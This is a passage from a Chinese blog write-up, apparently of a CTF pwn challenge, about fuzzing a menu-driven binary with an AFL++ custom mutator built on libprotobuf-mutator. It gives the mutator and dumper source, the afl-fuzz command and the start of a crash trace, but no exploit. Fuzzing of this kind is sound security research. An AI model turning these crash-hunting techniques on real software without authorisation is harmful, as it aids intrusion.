class="type">const</span> google::protobuf::Reflection *refl = msg.<span class="built_in">GetReflection</span>();</span><br></pre></td></tr></table></figure><p>这两行代码获取 Protobuf 消息的描述符和反射器，用于遍历消息字段。</p><ol><li><strong>遍历所有字段</strong>：</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">unsigned</span> fields = desc-&gt;<span class="built_in">field_count</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> i = <span class="number">0</span>; i &lt; fields; ++i) &#123;</span><br><span class="line">    <span class="type">const</span> google::protobuf::FieldDescriptor *field = desc-&gt;<span class="built_in">field</span>(i);</span><br></pre></td></tr></table></figure><p>这段代码获取消息的字段数量，并逐个遍历每个字段。</p><ol><li><strong>处理嵌套消息</strong>：</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (field-&gt;<span class="built_in">cpp_type</span>() == google::protobuf::FieldDescriptor::CPPTYPE_MESSAGE) &#123;</span><br><span class="line">    <span class="keyword">if</span> (field-&gt;<span class="built_in">is_repeated</span>()) &#123;</span><br><span class="line">        <span class="type">const</span> google::protobuf::RepeatedFieldRef&lt;google::protobuf::Message&gt; &amp;ptr = refl-&gt;<span class="built_in">GetRepeatedFieldRef</span>&lt;google::protobuf::Message&gt;(msg, field);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;child : ptr) &#123;</span><br><span class="line">            <span class="built_in">ProtoToDataHelper</span>(out, child);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refl-&gt;<span class="built_in">HasField</span>(msg, field)) &#123;</span><br><span class="line">        <span class="type">const</span> google::protobuf::Message &amp;child = refl-&gt;<span class="built_in">GetMessage</span>(msg, field);</span><br><span class="line">        <span class="built_in">ProtoToDataHelper</span>(out, child);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果字段是嵌套消息且是重复的，函数递归地处理每个子消息。如果字段是单个嵌套消息，且已设置，递归处理这个子消息。</p><p>在我们的例子中，<code>container</code> 有一个重复的嵌套消息 <code>items</code>，所以它会递归处理每个 <code>Data</code> 消息。</p><ol><li><strong>处理其他类型字段</strong>：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">else if (field-&gt;cpp_type() == google::protobuf::FieldDescriptor::CPPTYPE_INT32) &#123;</span><br><span class="line">    out.width(8);</span><br><span class="line">    out &lt;&lt; refl-&gt;GetInt32(msg, field);</span><br><span class="line">&#125; else if (field-&gt;cpp_type() == google::protobuf::FieldDescriptor::CPPTYPE_STRING) &#123;</span><br><span class="line">    out &lt;&lt; refl-&gt;GetString(msg, field) &lt;&lt; &quot;\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    abort();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果字段是 <code>int32</code> 类型，提取其值并写入 <code>stringstream</code>。如果字段是 <code>string</code> 类型，也提取其值并写入 <code>stringstream</code>。如果遇到其他类型的字段，则程序终止。</p><p><strong>示例输出</strong></p><p>对于上述示例数据，<code>ProtoToDataHelper</code> 函数会生成如下输出：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0Content 0</span><br><span class="line">1Content 1</span><br><span class="line">2Content 2</span><br></pre></td></tr></table></figure><p>解释一下：</p><ul><li><code>ProtoToDataHelper</code> 递归处理 <code>Container</code> 消息。</li><li>它发现 <code>items</code> 字段是一个重复的嵌套消息，依次处理每个 <code>Data</code> 消息。</li><li>对每个 <code>Data</code> 消息，提取 <code>id</code> 和 <code>content</code> 字段并写入 <code>stringstream</code>。</li></ul>              </div>            </details><p>所以，<code>ProtoToDataHelper</code> 函数的主要作用是遍历 Protobuf 消息，提取数据并以特定格式写入到 <code>stringstream</code>，方便后续处理或输出。</p><p>此外,<code>mutator.cc</code> 中还需要实现 AFLplusplus 需要的 API,所以我们需要针对mutator完善一些函数, <a href="https://github.com/AFLplusplus/AFLplusplus/blob/dev/docs/custom_mutators.md">Custom Mutators in AFL++</a></p><ul><li><code>void *afl_custom_init(void *afl, unsigned int seed)</code>：在执行 custom mutate 前需要执行的初始化操作，这里只需初始化一下随机种子。</li><li><code>size_t afl_custom_fuzz(void *data, unsigned char *buf, size_t buf_size, unsigned char **out_buf, unsigned char *add_buf, size_t add_buf_size, size_t max_size)</code> ：变异逻辑，在该代码中编写自己的变异逻辑。</li><li><code>size_t afl_custom_post_process(void* data, uint8_t *buf, size_t buf_size, uint8_t **out_buf)</code>：将 protobuf::Message 格式的二进制数据转换成 target 可读的数据。</li><li><code>void afl_custom_deinit(void *data)</code>：变异完成后需要做的事情，目前没有什么事情需要在这里进行处理。</li><li><code>int32_t afl_custom_init_trim(void *data, uint8_t *buf, size_t buf_size)</code>：自定义 trim 逻辑的初始化。为了<strong>防止 trim 逻辑破坏 protobuf::Message 的二进制数据</strong>，影响正常的 Parse 过程，这里可以让该函数直接返回0，跳过每次的 trim 阶段。</li><li><code>size_t afl_custom_trim(void *data, uint8_t **out_buf)</code>：自定义 trim 逻辑。由于<code>afl_custom_init_trim</code>函数返回0，因此实际上该函数不会被调用，但我们仍然必须声明该函数以启用自定义 trim 逻辑。</li></ul><p>即</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">static</span> <span class="built_in">std</span>::default_random_engine engine_pro;</span><br><span class="line"><span class="type">static</span> <span class="built_in">std</span>::uniform_int_distribution&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; <span class="title function_">dis</span><span class="params">(<span class="number">0</span>, UINT32_MAX)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">afl_custom_init</span><span class="params">(<span class="type">void</span> *afl, <span class="type">unsigned</span> <span class="type">int</span> seed)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unused(afl)</span></span><br><span class="line">engine_pro.seed(seed);</span><br><span class="line"><span class="keyword">return</span> nullptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">afl_custom_deinit</span><span class="params">(<span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(!data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">afl_custom_fuzz</span><span class="params">(<span class="type">void</span> *data, <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">size_t</span> buf_size, <span class="type">unsigned</span> <span class="type">char</span> **out_buf,</span></span><br><span class="line"><span class="params">   <span class="type">unsigned</span> <span class="type">char</span> *add_buf, <span class="type">size_t</span> add_buf_size, <span class="type">size_t</span> max_size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unused(data)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unused(buf)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unused(buf_size)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unused(add_buf)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unused(add_buf_size)</span></span><br><span class="line"></span><br><span class="line">menuctf::Choices msg;</span><br><span class="line"><span class="built_in">std</span>::random_device rd;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i++ &lt; <span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (rd() % <span class="number">100</span> &gt; <span class="number">80</span>)</span><br><span class="line">&#123;</span><br><span class="line">exit_choice(msg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (rd() % <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">new_content(msg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">edit_message(msg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">show_message(msg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">old_content(msg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">content_info(msg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint8_t</span> *saved_buf = nullptr;</span><br><span class="line"></span><br><span class="line">assert(buf_size &lt;= max_size);</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> *new_buf = (<span class="type">uint8_t</span> *)<span class="built_in">realloc</span>((<span class="type">void</span> *)saved_buf, max_size);</span><br><span class="line">saved_buf = new_buf;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> serialize_data;</span><br><span class="line">msg.SerializePartialToString(&amp;serialize_data);</span><br><span class="line"><span class="built_in">memcpy</span>(new_buf, serialize_data.c_str(), msg.ByteSizeLong());</span><br><span class="line">*out_buf = new_buf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> msg.ByteSizeLong();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">afl_custom_post_process</span><span class="params">(<span class="type">void</span> *data, <span class="type">uint8_t</span> *buf, <span class="type">size_t</span> buf_size, <span class="type">uint8_t</span> **out_buf)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unused(data)</span></span><br><span class="line"><span class="comment">// new_data is never free&#x27;d by pre_save_handler</span></span><br><span class="line"><span class="comment">// I prefer a slow but clearer implementation for now</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint8_t</span> *saved_buf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">menuctf::Choices msg;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">stringstream</span> stream;</span><br><span class="line"><span class="comment">// 如果加载成功</span></span><br><span class="line"><span class="keyword">if</span> (protobuf_mutator::libfuzzer::LoadProtoInput(<span class="literal">true</span>, buf, buf_size, &amp;msg))</span><br><span class="line">&#123;</span><br><span class="line">ProtoToDataHelper(stream, msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果加载失败，则返回 Exit Choice</span></span><br><span class="line"><span class="comment">/// <span class="doctag">NOTE:</span> 错误的变异 + 错误的 trim 将会导致 post process 加载失败，尤其是 trim 逻辑。</span></span><br><span class="line"><span class="comment">/// <span class="doctag">TODO:</span> 由于默认的 trim 会破坏样例，因此需要手动实现一个 trim，这里实现了一个空 trim，不进行任何操作</span></span><br><span class="line">ProtoToDataHelper(stream, menuctf::Exit());</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> str = stream.str();</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> *new_buf = (<span class="type">uint8_t</span> *)<span class="built_in">realloc</span>((<span class="type">void</span> *)saved_buf, str.size());</span><br><span class="line"><span class="keyword">if</span> (!new_buf)</span><br><span class="line">&#123;</span><br><span class="line">*out_buf = buf;</span><br><span class="line"><span class="keyword">return</span> buf_size;</span><br><span class="line">&#125;</span><br><span class="line">*out_buf = saved_buf = new_buf;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>((<span class="type">void</span> *)new_buf, str.c_str(), str.size());</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> str.size();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int32_t</span> <span class="title function_">afl_custom_init_trim</span><span class="params">(<span class="type">void</span> *data, <span class="type">uint8_t</span> *buf, <span class="type">size_t</span> buf_size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/// <span class="doctag">NOTE:</span> disable trim</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">afl_custom_trim</span><span class="params">(<span class="type">void</span> *data, <span class="type">uint8_t</span> **out_buf)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/// <span class="doctag">NOTE:</span> unreachable</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中用到了不少protobuf的cpp接口,可以参考<a href="https://protobuf.dev/reference/cpp/cpp-generated/#fields">https://protobuf.dev/reference/cpp/cpp-generated/#fields</a></p><p><code>afl_custom_post_process</code> 函数的主要作用是对 AFL变异后的输入数据进行后处理。它试图将变异后的输入数据转换为可读格式,利用前面提到的ProtoToDataHelper,并输出</p><p>然后是dumpcc的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libprotobuf-mutator/src/libfuzzer/libfuzzer_macro.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gen/out.pb.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mutator.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="built_in">std</span>::<span class="built_in">string</span> <span class="title function_">slurp</span><span class="params">(<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;path)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">ostringstream</span> buf;</span><br><span class="line"><span class="built_in">std</span>::ifstream <span class="title function_">input</span><span class="params">(path.c_str())</span>;</span><br><span class="line">buf &lt;&lt; input.rdbuf();</span><br><span class="line"><span class="keyword">return</span> buf.str();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">afl_custom_init</span><span class="params">(<span class="type">void</span> *afl, <span class="type">unsigned</span> <span class="type">int</span> seed)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">afl_custom_fuzz</span><span class="params">(<span class="type">void</span> *data, <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">size_t</span> buf_size, <span class="type">unsigned</span> <span class="type">char</span> **out_buf,</span></span><br><span class="line"><span class="params">   <span class="type">unsigned</span> <span class="type">char</span> *add_buf, <span class="type">size_t</span> add_buf_size, <span class="type">size_t</span> max_size)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">afl_custom_post_process</span><span class="params">(<span class="type">void</span> *data, <span class="type">uint8_t</span> *buf, <span class="type">size_t</span> buf_size, <span class="type">uint8_t</span> **out_buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">afl_custom_deinit</span><span class="params">(<span class="type">void</span> *data)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">menuctf::Choices msg;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试变异逻辑</span></span><br><span class="line"><span class="type">int</span> rand_fd;</span><br><span class="line"><span class="keyword">if</span> ((rand_fd = open(<span class="string">&quot;/dev/random&quot;</span>, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> seed;</span><br><span class="line">read(rand_fd, &amp;seed, <span class="keyword">sizeof</span>(seed));</span><br><span class="line">close(rand_fd);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *init_data = afl_custom_init(nullptr, seed);</span><br><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;gen&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint8_t</span> *out_buf = nullptr;</span><br><span class="line"><span class="type">size_t</span> new_size = afl_custom_fuzz(nullptr, nullptr, <span class="number">0</span>,</span><br><span class="line">&amp;out_buf, nullptr, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line"><span class="type">uint8_t</span> *new_str = nullptr;</span><br><span class="line"><span class="type">size_t</span> new_str_size = afl_custom_post_process(init_data, out_buf, new_size, &amp;new_str);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title function_">new_str_str</span><span class="params">((<span class="type">char</span> *)new_str, new_str_size)</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; new_str_str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-d&quot;</span>) &amp;&amp; argc &gt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">statbuf</span>;</span></span><br><span class="line">stat(argv[<span class="number">2</span>], &amp;statbuf);</span><br><span class="line"><span class="type">int</span> proto_size = statbuf.st_size;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* proto_buf = new <span class="type">char</span> [proto_size + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">FILE* proto_fp = fopen(argv[<span class="number">2</span>], <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!proto_fp) &#123; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">fread(proto_buf, proto_size, <span class="number">1</span>, proto_fp);</span><br><span class="line"></span><br><span class="line">menuctf::Choices msg;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">stringstream</span> stream;</span><br><span class="line"><span class="comment">// 如果加载成功</span></span><br><span class="line"><span class="keyword">if</span> (protobuf_mutator::libfuzzer::LoadProtoInput(<span class="literal">true</span>, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) proto_buf, proto_size, &amp;msg))</span><br><span class="line">&#123;</span><br><span class="line">ProtoToDataHelper(stream, msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; stream.str();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint8_t</span> *out_buf = nullptr;</span><br><span class="line"><span class="type">size_t</span> new_size = afl_custom_fuzz(nullptr, nullptr, <span class="number">0</span>,</span><br><span class="line">&amp;out_buf, nullptr, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line"><span class="type">uint8_t</span> *new_str = nullptr;</span><br><span class="line"><span class="type">size_t</span> new_str_size = afl_custom_post_process(init_data, out_buf, new_size, &amp;new_str);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title function_">new_str_str</span><span class="params">((<span class="type">char</span> *)new_str, new_str_size)</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; =============== &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; new_str_str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">&lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">afl_custom_deinit(init_data);</span><br><span class="line"></span><br><span class="line"><span class="comment">// std::cout &lt;&lt; &quot;msg DebugString: &quot; &lt;&lt; msg.DebugString() &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">//std::stringstream stream;</span></span><br><span class="line"><span class="comment">//ProtoToDataHelper(stream, msg);</span></span><br><span class="line"><span class="comment">//std::cout &lt;&lt; stream.str() &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我滴读写代码能力太差了,这几段代码理解的有点困难 orz,得找个时候认真看研究一下afl和protobuf了</p><p>之后做一些准备工作就可以开始fuzz了</p><p>input 文件夹需要自己新建，input 里面用 dumper 随便生成一个语料即可</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i input -o output -Q -- ./byteview</span><br></pre></td></tr></table></figure><p>之后不一会就可以看到出现了crash,tql</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-19_220452.png" alt=""></p><p>然后chuj大佬提到了产出的crash需要进行dumper -d转为可读形式</p><p>但试了一下不知道为什么没有输出,反而直接将crash作为输入能够导致崩溃,且看了一下与dumper gen生成的poc好像是一个形式,恩,对protobuf还不是很熟悉,先这样吧</p><p>作为输入测试,可以看到在too many后崩了,之后顺着这个分析应该就行了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">choice:</span><br><span class="line">how many data <span class="keyword">do</span> you want to add:</span><br><span class="line">too many!</span><br><span class="line">//-----------------//</span><br><span class="line">1. new 